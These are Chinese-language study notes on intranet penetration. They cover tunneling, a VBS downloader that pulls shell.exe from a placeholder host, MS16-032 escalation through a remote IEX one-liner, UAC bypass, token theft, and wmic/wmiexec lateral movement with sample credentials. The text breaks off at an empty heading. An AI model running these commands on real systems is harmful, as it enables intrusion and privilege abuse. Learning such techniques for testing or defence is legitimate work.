<h2 id="隐藏通信隧道技术"><a href="#隐藏通信隧道技术" class="headerlink" title="隐藏通信隧道技术"></a>隐藏通信隧道技术</h2><h3 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h3><h4 id="概述-2"><a href="#概述-2" class="headerlink" title="概述"></a>概述</h4><p>常见隧道：</p>
<ul>
<li>网络层：IPv6，ICMP，GRE</li>
<li>传输层：TCP，UDP，端口转发</li>
<li>应用层：SSH，HTTP，HTTPS，DNS</li>
</ul>
<h4 id="判断内网连通性"><a href="#判断内网连通性" class="headerlink" title="判断内网连通性"></a>判断内网连通性</h4><ul>
<li>ICMP：<code>ping &lt;ip&gt;</code></li>
<li>TCP：<code>nc &lt;ip&gt; &lt;port&gt;</code></li>
<li>HTTP：<code>curl &lt;ip&gt;:&lt;port&gt;</code></li>
<li>DNS：<code>nslookup &lt;domainname&gt; &lt;vps-ip&gt;</code>，<code>dig @&lt;vps-ip&gt;  &lt;domainname&gt;</code></li>
</ul>
<p>有时流量不能直接流出，需要在内网中设置代理服务器，常用于通过企业办公网段上网的场景。判断方式：查看网络连接是否有与其他主机的8080端口（大概率）存在连接；查看内网中是否有主机名类似于 “proxy” 的机器；查看 IE 浏览器的直接代理；根据 pac 文件的路径（本地或远程），下载并查看；执行以下命令确认</p>
<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">curl</span> <span class="selector-tag">www</span><span class="selector-class">.baidu</span><span class="selector-class">.com</span>						# 不通</span><br><span class="line"><span class="selector-tag">curl</span> <span class="selector-tag">-X</span> &lt;<span class="selector-tag">proxyip</span><span class="selector-pseudo">:port</span>&gt; <span class="selector-tag">www</span><span class="selector-class">.baidu</span><span class="selector-class">.com</span>	# 通</span><br></pre></td></tr></table></figure>

<h3 id="网络层隧道"><a href="#网络层隧道" class="headerlink" title="网络层隧道"></a>网络层隧道</h3><h4 id="IPv6-隧道"><a href="#IPv6-隧道" class="headerlink" title="IPv6 隧道"></a>IPv6 隧道</h4><p>IPv6 隧道技术指通过 IPv4 隧道传递 IPv6 数据报文的技术。</p>
<p>工具：socat, 6tunnel, nt6tunnel</p>
<h4 id="ICMP-隧道"><a href="#ICMP-隧道" class="headerlink" title="ICMP 隧道"></a>ICMP 隧道</h4><p>工具：<a target="_blank" rel="noopener" href="https://github.com/inquisb/icmpsh">icmpsh</a>, <a target="_blank" rel="noopener" href="https://github.com/esrrhs/pingtunnel">pingtunnel</a></p>
<h3 id="传输层隧道技术"><a href="#传输层隧道技术" class="headerlink" title="传输层隧道技术"></a>传输层隧道技术</h3><p>工具：lcx, nc, powercat</p>
<h3 id="应用层隧道技术"><a href="#应用层隧道技术" class="headerlink" title="应用层隧道技术"></a>应用层隧道技术</h3><p>SSH DNS</p>
<p>dnscat2</p>
<h3 id="Socks-代理"><a href="#Socks-代理" class="headerlink" title="Socks 代理"></a>Socks 代理</h3><p>earthworm</p>
<p>reGeorg</p>
<p>sSocks</p>
<p>SocksCap64</p>
<p>Proxifier</p>
<p>ProxyChains</p>
<h3 id="压缩数据"><a href="#压缩数据" class="headerlink" title="压缩数据"></a>压缩数据</h3><h4 id="rar-exe"><a href="#rar-exe" class="headerlink" title="rar.exe"></a>rar.exe</h4><p>将E:\webs\目录下的所有内容打包为1.rar放入E:\webs\目录下</p>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rar<span class="selector-class">.exe</span> <span class="selector-tag">a</span> -k -r -s -m3 E:\webs\<span class="number">1</span><span class="selector-class">.rar</span> E:\webs\</span><br></pre></td></tr></table></figure>

<p>将E:\webs\1.rar解压到当前根目录下</p>
<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">rar</span><span class="selector-class">.exe</span> <span class="selector-tag">e</span> <span class="selector-tag">E</span>:\<span class="selector-tag">webs</span>\1<span class="selector-class">.rar</span></span><br></pre></td></tr></table></figure>

<p>分卷压缩、解压</p>
<p>分卷压缩E盘API目录下的所有文件及文件夹，设置每个分卷为20M</p>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rar<span class="selector-class">.exe</span> <span class="selector-tag">a</span> -m0 -r -v20m E:\test<span class="selector-class">.rar</span> E:\API</span><br></pre></td></tr></table></figure>

<p>将E:\test.part01.rar解压到E盘的x1目录下</p>
<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">rar</span><span class="selector-class">.exe</span> <span class="selector-tag">x</span> <span class="selector-tag">E</span>:\<span class="selector-tag">test</span><span class="selector-class">.part01</span><span class="selector-class">.rar</span> <span class="selector-tag">E</span>:\<span class="selector-tag">x1</span></span><br></pre></td></tr></table></figure>

<h4 id="7zip"><a href="#7zip" class="headerlink" title="7zip"></a>7zip</h4><h3 id="上传和下载"><a href="#上传和下载" class="headerlink" title="上传和下载"></a>上传和下载</h3><h4 id="FTP"><a href="#FTP" class="headerlink" title="FTP"></a>FTP</h4><h4 id="VBS"><a href="#VBS" class="headerlink" title="VBS"></a>VBS</h4><p>download.vbs代码：</p>
<figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">Set</span> <span class="keyword">Post</span>=CreateObject(<span class="string">&quot;Msxml2.XMLHTTP&quot;</span>)</span><br><span class="line"><span class="keyword">Set</span> <span class="keyword">shell</span> = CreateObject(<span class="string">&quot;Wscript.Shell&quot;</span>)</span><br><span class="line"><span class="keyword">post</span>.<span class="keyword">Open</span> <span class="string">&quot;GET&quot;</span>,<span class="string">&quot;http://IP/shell.exe&quot;</span>,0</span><br><span class="line"><span class="keyword">post</span>.Send()</span><br><span class="line"><span class="keyword">Set</span> aGet = CreateObject(<span class="string">&quot;ADODB.Stream&quot;</span>)</span><br><span class="line">aGet.Mode = 3</span><br><span class="line">aGet.<span class="keyword">Type</span> = 1</span><br><span class="line">aGet.<span class="keyword">Open</span>()</span><br><span class="line">aGet.Write(<span class="keyword">post</span>.responseBody)</span><br><span class="line">aGet.SaveToFile <span class="string">&quot;C:\test\shell.exe&quot;</span>,2</span><br></pre></td></tr></table></figure>

<p>执行下面命令即可在目标主机上下载shell.exe文件</p>
<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">Cscript</span> <span class="selector-tag">download</span><span class="selector-class">.vbs</span></span><br></pre></td></tr></table></figure>

<h4 id="利用-Debug"><a href="#利用-Debug" class="headerlink" title="利用 Debug"></a>利用 Debug</h4><h4 id="利用-Nishang-上传"><a href="#利用-Nishang-上传" class="headerlink" title="利用 Nishang 上传"></a>利用 Nishang 上传</h4><h4 id="利用-bitsadmin-下载"><a href="#利用-bitsadmin-下载" class="headerlink" title="利用 bitsadmin 下载"></a>利用 bitsadmin 下载</h4><h2 id="权限提升分析及防御"><a href="#权限提升分析及防御" class="headerlink" title="权限提升分析及防御"></a>权限提升分析及防御</h2><p>Windows 最高权限 Trusted Installer，可以修改系统文件，高于 System</p>
<p>提权分为横向提权和纵向提权</p>
<h3 id="系统内核溢出漏洞提权分析及防范"><a href="#系统内核溢出漏洞提权分析及防范" class="headerlink" title="系统内核溢出漏洞提权分析及防范"></a>系统内核溢出漏洞提权分析及防范</h3><h4 id="通过手动执行命令发现缺失补丁"><a href="#通过手动执行命令发现缺失补丁" class="headerlink" title="通过手动执行命令发现缺失补丁"></a>通过手动执行命令发现缺失补丁</h4><figure class="highlight actionscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//查看当前权限</span></span><br><span class="line">whoami /groups</span><br><span class="line"></span><br><span class="line">systeminfo</span><br><span class="line"></span><br><span class="line">wmic qfe <span class="keyword">get</span> Caption,Description,HotFixID,InstalledOn</span><br></pre></td></tr></table></figure>

<p>这个链接里也描述了一些方法和工具：<a target="_blank" rel="noopener" href="https://www.k0rz3n.com/2019/01/27/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%B0%8F%E6%8A%80%E5%B7%A7%E4%B8%80%EF%BC%9A%E5%AF%BB%E6%89%BEEXP/">https://www.k0rz3n.com/2019/01/27/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%B0%8F%E6%8A%80%E5%B7%A7%E4%B8%80%EF%BC%9A%E5%AF%BB%E6%89%BEEXP/</a></p>
<p>可以通过对比KB来判断是否存在提权漏洞。</p>
<h4 id="MS16-032"><a href="#MS16-032" class="headerlink" title="MS16-032"></a>MS16-032</h4><p>可以使用Invoke-MS16-032.ps1工具:<a target="_blank" rel="noopener" href="https://raw.githubusercontent.com/Ridter/Pentest/master/powershell/MyShell/Invoke-MS16-032.ps1">https://raw.githubusercontent.com/Ridter/Pentest/master/powershell/MyShell/Invoke-MS16-032.ps1</a></p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Invoke</span>-MS<span class="number">16</span>-<span class="number">032</span> -Application cmd.exe -Commandline <span class="string">&quot;/c net user 1 1 /add&quot;</span></span><br></pre></td></tr></table></figure>

<p>远程加载：</p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell -nop -exec bypass -c <span class="string">&quot;IEX(New-Object Net.WebClient).DownloadString(https://raw.githubusercontent.com/Ridter/Pentest/master/powershell/MyShell/Invoke-MS16-032.ps1);Invoke-MS16-032 -Application cmd.exe -Commandline &quot;</span>/c net<span class="built_in"> user </span>1 1 /add<span class="string">&quot;&quot;</span></span><br></pre></td></tr></table></figure>

<p>MS16-032的补丁编号为KB3139914</p>
<h4 id="利用MSF发现缺失补丁"><a href="#利用MSF发现缺失补丁" class="headerlink" title="利用MSF发现缺失补丁"></a>利用MSF发现缺失补丁</h4><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">use post<span class="regexp">/windows/g</span>ather/enum_patches</span><br></pre></td></tr></table></figure>

<h4 id="Windows-Exploit-Suggester"><a href="#Windows-Exploit-Suggester" class="headerlink" title="Windows Exploit Suggester"></a>Windows Exploit Suggester</h4><p>将systeminfo信息输出到txt文件中</p>
<figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">systeminfo</span> &gt; <span class="literal">info</span>.txt</span><br></pre></td></tr></table></figure>

<p>windows-exploit-suggester下载地址：<a target="_blank" rel="noopener" href="https://github.com/AonCyberLabs/Windows-Exploit-Suggester">https://github.com/AonCyberLabs/Windows-Exploit-Suggester</a></p>
<figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">./windows-exploit-suggester.py</span> <span class="params">--update</span></span><br><span class="line">pip install xlrd <span class="params">--upgrade</span></span><br><span class="line"><span class="string">/windows-exploit-suggester.py</span> -d BulletinSearch.xlsx -i info.txt</span><br></pre></td></tr></table></figure>

<p>MSF中也存在此模块</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">use post<span class="regexp">/multi/</span>recon/local_exploit_suggester</span><br></pre></td></tr></table></figure>

<h4 id="Powershell中的Sherlock"><a href="#Powershell中的Sherlock" class="headerlink" title="Powershell中的Sherlock"></a>Powershell中的Sherlock</h4><p>下载地址：<a target="_blank" rel="noopener" href="https://raw.githubusercontent.com/rasta-mouse/Sherlock/master/Sherlock.ps1">https://raw.githubusercontent.com/rasta-mouse/Sherlock/master/Sherlock.ps1</a></p>
<figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">. .\sherlock.ps1</span><br><span class="line"><span class="built_in">find</span>-AllVulns</span><br></pre></td></tr></table></figure>

<h3 id="Windows-操作系统配置错误急用分析和防范"><a href="#Windows-操作系统配置错误急用分析和防范" class="headerlink" title="Windows 操作系统配置错误急用分析和防范"></a>Windows 操作系统配置错误急用分析和防范</h3><h4 id="系统服务权限配置错误"><a href="#系统服务权限配置错误" class="headerlink" title="系统服务权限配置错误"></a>系统服务权限配置错误</h4><p>使用Powerup</p>
<figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">. .\<span class="module-access"><span class="module"><span class="identifier">Powerup</span>.</span></span>ps1</span><br><span class="line">Invoke-AllChecks</span><br></pre></td></tr></table></figure>

<h4 id="可信任服务路径漏洞"><a href="#可信任服务路径漏洞" class="headerlink" title="可信任服务路径漏洞"></a>可信任服务路径漏洞</h4><p>这个漏洞在书中说明了利用方式，但是并没有说明根本原理，这个漏洞是由于使用CreateProcess函数创建进程时对第二个参数中的文件路径没有使用双引号括起来，这个不再说明了，在之前整理ATT&amp;CK的文档的时候已经弄过了很多遍。可以参考这个文档：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/sevck/p/8488469.html">https://www.cnblogs.com/sevck/p/8488469.html</a></p>
<p>书中说到了一个查找漏洞存在的方法：</p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic<span class="built_in"> service </span><span class="builtin-name">get</span> name,displayname,pathname,startmode |findstr /i <span class="string">&quot;Auto&quot;</span> |findstr /i /c <span class="string">&quot;C:\Windows\\&quot;</span> |findstr /i /v <span class="string">&quot;&quot;</span><span class="string">&quot;</span></span><br></pre></td></tr></table></figure>

<p>MSF中存在能够利用的模块（需要有session）：</p>
<figure class="highlight actionscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">use</span> trusted_service_path</span><br></pre></td></tr></table></figure>

<h4 id="自动安装配置文件"><a href="#自动安装配置文件" class="headerlink" title="自动安装配置文件"></a>自动安装配置文件</h4><p>利用的是网络管理员在内网中给多台机器配置环境的配置文件中的敏感信息，如密码等。常用配置文件目录：</p>
<figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sysprep.<span class="literal">inf</span></span><br><span class="line">sysprep.xml</span><br><span class="line">unattend.xml</span><br><span class="line">unattended.xml</span><br></pre></td></tr></table></figure>

<p>MSF中的利用模块：</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">use post<span class="regexp">/windows/g</span>ather/enum_unattend</span><br></pre></td></tr></table></figure>

<h4 id="计划任务"><a href="#计划任务" class="headerlink" title="计划任务"></a>计划任务</h4><p>查看当前计划任务：</p>
<figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">schtasks <span class="string">/query</span> <span class="string">/fo</span> LIST <span class="string">/v</span></span><br></pre></td></tr></table></figure>

<p>这里提到了一个工具，AccessChk用于在Windows中运行一些系统或程序的高级查询，管理和故障排除工作。可以通过这个工具来查看指定目录的权限配置情况，如果当前权限有某个高权限的程序执行文件的写权限，那么就可以替换高权限文件进行权限提升。（这里说到的是使用计划任务来进行定时执行）</p>
<p>使用方法：</p>
<figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="regexp">//不弹框运行</span></span><br><span class="line"><span class="regexp">accesschk.exe /accepteula</span></span><br><span class="line"><span class="regexp">//</span>这里原书中的命令空格被吞了，说的是列出某个驱动器下所有权限配置有缺陷的文件夹,但是使用了之后发现应该不会遍历所有的文件夹</span><br><span class="line">.<span class="string">\accesschk.exe</span> -uwdqs Users c:<span class="string">\</span></span><br><span class="line">.<span class="string">\accesschk.exe</span> -uwdqs <span class="string">&quot;Authenticated Users&quot;</span> c:<span class="string">\</span></span><br></pre></td></tr></table></figure>

<h4 id="Empire-的-Powerup-模块"><a href="#Empire-的-Powerup-模块" class="headerlink" title="Empire 的 Powerup 模块"></a>Empire 的 Powerup 模块</h4><h3 id="组策略首选项提权分析及防范"><a href="#组策略首选项提权分析及防范" class="headerlink" title="组策略首选项提权分析及防范"></a>组策略首选项提权分析及防范</h3><p>这个说的就是查找组策略配置文件中加密过的密码，主要就是Group.xml等文件。</p>
<p>可以直接使用PowerSploit中的Get-GPPPassword.ps1来获取</p>
<figure class="highlight mathematica"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">. .\<span class="keyword">Get</span>-GPPpassword.ps1</span><br><span class="line"><span class="keyword">Get</span>-GppPassword</span><br></pre></td></tr></table></figure>

<p>然后使用gpprefdecrypt.py脚本进行解密:</p>
<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">python</span> gpprefdecrypt.<span class="keyword">py</span> XXXXXXXXXXXXXXXXXXXX</span><br></pre></td></tr></table></figure>

<h3 id="绕过-UAC-提权分析及防范"><a href="#绕过-UAC-提权分析及防范" class="headerlink" title="绕过 UAC 提权分析及防范"></a>绕过 UAC 提权分析及防范</h3><h4 id="MSF-中的-Bypassuac"><a href="#MSF-中的-Bypassuac" class="headerlink" title="MSF 中的 Bypassuac"></a>MSF 中的 Bypassuac</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">use</span> exploit/windows/<span class="keyword">local</span>/bypassuac</span><br><span class="line"><span class="keyword">set</span> <span class="keyword">session</span> X</span><br><span class="line">run</span><br></pre></td></tr></table></figure>

<h4 id="MSF-中的-RunAs"><a href="#MSF-中的-RunAs" class="headerlink" title="MSF 中的 RunAs"></a>MSF 中的 RunAs</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">use</span> exploit/windows/<span class="keyword">local</span>/ask</span><br><span class="line"><span class="keyword">set</span> <span class="keyword">session</span> X</span><br><span class="line">run</span><br></pre></td></tr></table></figure>

<p>运行后目标主机会弹出一个 UAC 的框，点击是之后才会回弹一个新的 session，如果弹回的不是 system 权限的 session 可以使用 getsystem 命令提升</p>
<h4 id="Nishang-中的-Invoke-PsUACme-模块"><a href="#Nishang-中的-Invoke-PsUACme-模块" class="headerlink" title="Nishang 中的 Invoke-PsUACme 模块"></a>Nishang 中的 Invoke-PsUACme 模块</h4><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">/使用sysprep方法并执行默认的payload</span><br><span class="line">Invoke-PsUACme -Verbose</span><br><span class="line"><span class="regexp">//</span>使用oobe方法并执行默认的payload</span><br><span class="line">Invoke-PsUACme -methed oobe -Verbose</span><br><span class="line"><span class="regexp">//</span>使用oobe方法执行自定义的payload</span><br><span class="line">Invoke-PsUACme -methed oobe -Payload <span class="string">&quot;powershell -windowstyle hidden -e &lt;your encoded payload&gt;&quot;</span></span><br></pre></td></tr></table></figure>

<p>可以使用payloadpath参数指定payload的路径。</p>
<h4 id="Empire-中的-bypassuac-模块"><a href="#Empire-中的-bypassuac-模块" class="headerlink" title="Empire 中的 bypassuac 模块"></a>Empire 中的 bypassuac 模块</h4><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">usemodule</span> privesc/bypassuac</span><br></pre></td></tr></table></figure>

<h3 id="令牌窃取分析及防范"><a href="#令牌窃取分析及防范" class="headerlink" title="令牌窃取分析及防范"></a>令牌窃取分析及防范</h3><figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">access <span class="built_in">token</span>访问令牌：代表访问控制操作主体的系统对象</span><br><span class="line">security <span class="built_in">token</span>认证令牌或硬件令牌：是一种用于实现计算机身份校验的物理设备，例如U盾</span><br><span class="line">session <span class="built_in">token</span>会话令牌：是交互会话中唯一的身份标识符</span><br></pre></td></tr></table></figure>

<p>伪造令牌攻击的核心是Kerberos协议。</p>
<h4 id="令牌窃取"><a href="#令牌窃取" class="headerlink" title="令牌窃取"></a>令牌窃取</h4><p>MSF中的利用(已经有meterpreter)：</p>
<figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">use</span> <span class="string">incognito</span></span><br><span class="line"><span class="attr">list_tokens</span> <span class="string">-u</span></span><br></pre></td></tr></table></figure>

<p>两种类型的令牌：</p>
<figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">Delegation</span> <span class="string">Tokens 授权令牌：支持交互式登录（例如可以通过远程桌面登录及访问）</span></span><br><span class="line"><span class="attr">Impersonation</span> <span class="string">Tokens 模拟令牌：支持非交互式的会话</span></span><br></pre></td></tr></table></figure>

<p>在MSF中可以选择使用某一个特定的TOKEN</p>
<figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">impersonate_token</span></span><br></pre></td></tr></table></figure>

<h4 id="Rotten-Potato本地提权分析"><a href="#Rotten-Potato本地提权分析" class="headerlink" title="Rotten Potato本地提权分析"></a>Rotten Potato本地提权分析</h4><p>利用的前提是系统中要存在有效的令牌，然后用这个工具快速模拟用户令牌，书中的环境存在SYSTEM的token，所以可以使用下面的命令进行窃取</p>
<p>下载地址：<a target="_blank" rel="noopener" href="https://github.com/foxglovesec/RottenPotato.git">https://github.com/foxglovesec/RottenPotato.git</a></p>
<figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">upload /opt/RottenPotato/rottenpotato.exe</span><br><span class="line">execute -HC -f rottenpotato.exe</span><br><span class="line">impersonate_token <span class="string">&quot;NT AUTHORITY\\SYSTEM&quot;</span></span><br></pre></td></tr></table></figure>

<h4 id="添加域管理员"><a href="#添加域管理员" class="headerlink" title="添加域管理员"></a>添加域管理员</h4><p>这里说到了使用MSF的migrate命令，借助system权限的进程进行执行命令</p>
<h4 id="Empire-下的令牌窃取分析"><a href="#Empire-下的令牌窃取分析" class="headerlink" title="Empire 下的令牌窃取分析"></a>Empire 下的令牌窃取分析</h4><p>使用Empire下的creds命令和mimikatz模块进行pth攻击</p>
<h2 id="无凭证条件下的权限获取分析及防范"><a href="#无凭证条件下的权限获取分析及防范" class="headerlink" title="无凭证条件下的权限获取分析及防范"></a>无凭证条件下的权限获取分析及防范</h2><p>使用Responder进行欺骗</p>
<h2 id="域内横向移动分析及防御"><a href="#域内横向移动分析及防御" class="headerlink" title="域内横向移动分析及防御"></a>域内横向移动分析及防御</h2><h3 id="常用-Windows-远程连接和命令"><a href="#常用-Windows-远程连接和命令" class="headerlink" title="常用 Windows 远程连接和命令"></a>常用 Windows 远程连接和命令</h3><p>IPC</p>
<figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net use \\<span class="number">192.168</span><span class="number">.1</span><span class="number">.10</span>\ipc$ <span class="string">&quot;admin123&quot;</span> /user:administrator</span><br></pre></td></tr></table></figure>

<p>dir</p>
<figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dir \\<span class="number">192.168</span><span class="number">.1</span><span class="number">.10</span>\c$</span><br></pre></td></tr></table></figure>

<p>tasklist</p>
<figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tasklist /S <span class="number">192.168</span><span class="number">.1</span><span class="number">.10</span> /U administrator /P admin123</span><br></pre></td></tr></table></figure>

<p>at：是Windows server 2008之前的计划任务命令</p>
<figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">at \\<span class="number">192.168</span><span class="number">.1</span><span class="number">.10</span> <span class="number">4</span>:<span class="number">11</span>PM C:\shell.bat</span><br></pre></td></tr></table></figure>

<p>创建之后会有一个任务ID，指定任务ID可以删除</p>
<figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">at \\<span class="number">192.168</span><span class="number">.1</span><span class="number">.10</span> <span class="number">7</span> /delete</span><br></pre></td></tr></table></figure>

<p>schtasks</p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">schtasks /create /s 192.168.1.10 /tn test /sc onstart /tr C:\calc.bat /ru<span class="built_in"> system </span>/f</span><br></pre></td></tr></table></figure>

<h3 id="ATT-amp-CK-Credential"><a href="#ATT-amp-CK-Credential" class="headerlink" title="ATT&amp;CK Credential"></a>ATT&amp;CK Credential</h3><h3 id="WMI"><a href="#WMI" class="headerlink" title="WMI"></a>WMI</h3><p>基本的执行方式：</p>
<figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic /<span class="keyword">node</span><span class="title">:192</span>.<span class="number">168.1</span>.<span class="number">10</span> /user:administrator /password:admin123 process call create <span class="string">&quot;cmd.exe&quot;</span> /c ipconfig &gt; ip.txt<span class="string">&quot;</span></span><br></pre></td></tr></table></figure>

<p>其他工具：</p>
<p>impacket中的wmiexec，成功连接之后会有一个交互式的命令行</p>
<figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmiexec.py administrator:<span class="symbol">admin123@</span><span class="number">192.168</span><span class="number">.1</span><span class="number">.10</span></span><br></pre></td></tr></table></figure>

<p>wmiexec.vbs</p>
<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">cscript.exe</span> <span class="string">//nologo</span> <span class="string">wmiexec.vbs</span> <span class="string">/shell</span> <span class="number">192.168</span><span class="number">.1</span><span class="number">.10</span> <span class="string">administrator</span> <span class="string">admin123</span></span><br><span class="line"></span><br><span class="line"><span class="string">cscript.exe</span> <span class="string">wmiexec.vbs</span> <span class="string">/cmd</span> <span class="number">192.168</span><span class="number">.1</span><span class="number">.10</span> <span class="string">administrator</span> <span class="string">admin123</span> <span class="string">&quot;ipconfig&quot;</span></span><br></pre></td></tr></table></figure>

<p>Invoke-WMICommand</p>
<p>Invoke-WMICommand是PowerSpolit中的脚本：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$user = <span class="string">&quot;test\administrator&quot;</span></span><br><span class="line">$password = ConverTo-SecureString -<span class="keyword">String</span> <span class="string">&quot;admin123&quot;</span> -AsPlainText -Force</span><br><span class="line">$Cred = <span class="keyword">New</span>-<span class="keyword">Object</span> -TypeName System.Management.Automation.PSCredential -ArgumentList $user, $password</span><br><span class="line">$remote = Invoke-WmiCommand -Payload &#123;ipconfig&#125; -Credential $Cred -ComputerName <span class="number">192.168</span><span class="number">.1</span><span class="number">.10</span></span><br><span class="line">$remote.PayloadOutput</span><br></pre></td></tr></table></figure>

<p>Invoke-WMIMethod是powershell自带的</p>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$user</span> = <span class="string">&quot;test\administrator&quot;</span></span><br><span class="line"><span class="variable">$password</span> = ConverTo-SecureString -String <span class="string">&quot;admin123&quot;</span> -AsPlainText -Force</span><br><span class="line"><span class="variable">$Cred</span> = New-Object -TypeName System<span class="selector-class">.Management</span><span class="selector-class">.Automation</span><span class="selector-class">.PSCredential</span> -ArgumentList <span class="variable">$user</span>, <span class="variable">$password</span></span><br><span class="line">Invoke-WMIMethod -Class Win32_Process -Name Create -ArgumentList <span class="string">&quot;ipconfig&quot;</span> -ComputerName <span class="string">&quot;192.168.1.10&quot;</span> -Credential <span class="variable">$Cred</span></span><br></pre></td></tr></table></figure>

<h3 id="SMBEXEC"><a href="#SMBEXEC" class="headerlink" title="SMBEXEC"></a>SMBEXEC</h3><p>Impacket中有这个插件</p>
<p>Linux版本下载地址：<a target="_blank" rel="noopener" href="https://github.com/brav0hax/smbexec.git">https://github.com/brav0hax/smbexec.git</a></p>
<p>安装命令：</p>
